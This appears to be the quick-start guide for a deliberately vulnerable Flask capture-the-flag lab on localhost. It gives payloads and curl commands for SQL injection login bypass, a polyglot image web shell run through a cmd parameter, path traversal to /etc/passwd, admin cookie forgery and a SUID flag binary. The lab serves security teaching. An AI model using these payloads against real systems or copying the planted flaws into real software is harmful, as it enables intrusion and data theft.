# 🚀 QUICK START GUIDE

## Installation (2 minutes)

```bash
# 1. Install dependencies
pip install Flask Pillow

# 2. Navigate to project
cd c:\Users\SIDHARTH\OneDrive\Desktop\webhack

# 3. Run application  
python app.py
```

Application starts at: **http://localhost:5000**

---

## Access Points

| URL | Purpose | Access |
|-----|---------|--------|
| `/login` | Login page | Public |
| `/register` | Registration | Public |
| `/dashboard` | Main dashboard | Authenticated |
| `/upload` | File upload | Authenticated |
| `/robots.txt` | Security misconfiguration | Public |
| `/backup` | Backup directory | Public |
| `/backup/app.py.bak` | Source code! | Public |
| `/backup/config.txt` | Credentials! | Public |
| `/admin/system-info` | Admin panel (requires cookie) | Admin cookie |
| `/admin/readflag` | Flag endpoint (requires cookie) | Admin cookie |

---

## Default Test Users

```
Username: admin
Password: admin123

Username: user1  
Password: password

Username: user2
Password: 12345
```

---

## 5 FLAGS TO FIND

### Flag #1: Information Disclosure
**Where:** `/backup/config.txt`  
**How:** Navigate to backup and read config  
**Hint:** Check robots.txt first

### Flag #2: File Upload Bypass
**Where:** Uploaded polyglot file execution  
**How:** Upload image containing PHP code  
**Command:** `curl http://localhost:5000/static/uploads/shell.jpg?cmd=id`

### Flag #3: Path Traversal + SSTI
**Where:** `/view` endpoint  
**How:** Traverse to file, trigger template injection  
**Payload:** `....//../` (bypasses single removal)

### Flag #4: SQL Injection
**Where:** Login form  
**How:** Use SQL comments to bypass password  
**Payload:** `admin' --` (username field)

### Flag #5: Privilege Escalation
**Where:** Admin endpoints  
**How:** Set admin cookie, execute commands  
**Command:** `curl -b "admin=true" http://localhost:5000/admin/readflag`

---

## Quick Exploitation Commands

```bash
# FLAG 1: Get config
curl http://localhost:5000/backup/config.txt

# FLAG 2: Upload and execute
curl -F "file=@shell.jpg" http://localhost:5000/upload
curl "http://localhost:5000/static/uploads/shell.jpg?cmd=whoami"

# FLAG 3: Path traversal  
curl "http://localhost:5000/view?file=....//../etc/passwd"

# FLAG 4: SQL injection (in browser)
# Login as: admin' --
# (or use curl with form data)

# FLAG 5: Admin access
curl -b "admin=true" http://localhost:5000/admin/readflag
```

---

## Browser Testing

1. Open `http://localhost:5000/login`
2. Username: `admin' --`
3. Password: (leave blank)
4. Click Login → DATABASE ERROR REVEALS STRUCTURE
5. Go to `/backup` → Find credentials
6. Go to `/admin/readflag` (after setting admin cookie)

---

## Tools Provided

### polyglot.py
Generates image files containing PHP:
```bash
python tools/polyglot.py ./static/uploads
```

Creates:
- shell.jpg
- shell.gif  
- shell.png
- ssti.jpg

### readflag.c
SUID binary source (for Linux):
```bash
gcc -o readflag bin/readflag.c
sudo chown root:root readflag
sudo chmod 4755 readflag
./readflag
```

---

## Learning Path

**Stage 1 (5 min):** Reconnaissance
- Discover `/robots.txt`
- Find `/backup` directory
- Locate credentials in config

**Stage 2 (10 min):** File Upload
- Generate polyglot files
- Upload to `/upload`
- Execute via URL with `?cmd=...`

**Stage 3 (15 min):** Advanced Exploitation
- Understand path traversal
- Craft SSTI payloads
- Chain multiple vulnerabilities

**Stage 4 (5 min):** Database Attack
- SQL injection in login
- Authentication bypass
- Understand statement building

**Stage 5 (20 min):** Privilege Escalation
- Cookie manipulation
- Command injection
- Admin access

---

## Troubleshooting

### Flask port already in use
```bash
python app.py --port 5001
```

### Dependencies not installed
```bash
pip install -r requirements.txt
```

### File upload directory not writable
```bash
mkdir -p static/uploads
chmod 777 static/uploads
```

### Database doesn't load
```bash
rm vulnerable.db  # Delete old database
python app.py     # Recreate
```

---

## Key Passwords & Secrets Found

Search for these strings in the config:
- Admin password hint
- Database credentials
- API keys
- AWS secrets
- JWT keys

All visible at `/backup/config.txt`!

---

## Success Indicators

✅ See SQL error with table structure  
✅ Upload file successfully  
✅ Execute PHP code via parameters  
✅ Read arbitrary files  
✅ Access admin functions with cookie

---

## Time Estimates

| Task | Time |
|------|------|
| Setup & Install | 2 min |
| Flag #1 | 5 min |
| Flag #2 | 10 min |
| Flag #3 | 15 min |
| Flag #4 | 5 min |
| Flag #5 | 20 min |
| **TOTAL** | **57 min** |

---

## Next Steps

1. ✅ **Run app:** `python app.py`
2. ✅ **Open browser:** `http://localhost:5000`
3. ✅ **Start reconnaissance:** `/robots.txt`
4. ✅ **Find flags:** Follow hints above
5. ✅ **Document findings:** Record all exploits
6. ✅ **Learn concepts:** Read SOLUTION.md for details

---

**Ready to hack?** Start the application and visit `/login`! 🎯
